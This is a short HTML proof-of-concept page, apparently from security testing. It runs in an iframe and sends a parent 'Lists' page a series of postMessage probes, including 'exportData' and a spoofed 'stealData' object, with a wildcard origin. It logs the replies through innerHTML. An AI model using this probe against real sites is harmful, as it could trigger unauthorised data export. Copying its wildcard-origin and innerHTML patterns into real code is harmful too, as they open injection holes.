<!DOCTYPE html>
<html>
<head>
  <title>PoC: postMessage via iframe</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>ðŸ”¥ PoC postMessage ativa</h1>
  <div id="log"></div>

  <script>
    // Envia mensagem para a pÃ¡gina Lists
    function sendTestMessages() {
      const payloads = [
        { type: "ping" },
        { type: "getListInfo" },
        { action: "openDialog" },
        { command: "exportData" },
        { spoof: true, try: "stealData" },
        "Hello from iframe ðŸ‘‹"
      ];

      payloads.forEach((msg, i) => {
        setTimeout(() => {
          parent.postMessage(msg, "*");
          log("ðŸ”¼ Enviado: " + JSON.stringify(msg));
        }, 1000 * (i + 1));
      });
    }

    // Escuta respostas da pÃ¡gina Lists
    window.addEventListener("message", (event) => {
      log("ðŸ“¥ Recebido de " + event.origin + ":<br>" + JSON.stringify(event.data, null, 2));
    });

    // Logger simples
    function log(msg) {
      const div = document.getElementById("log");
      const p = document.createElement("p");
      p.innerHTML = msg;
      div.appendChild(p);
    }

    // ComeÃ§a o teste
    sendTestMessages();
  </script>
</body>
</html>
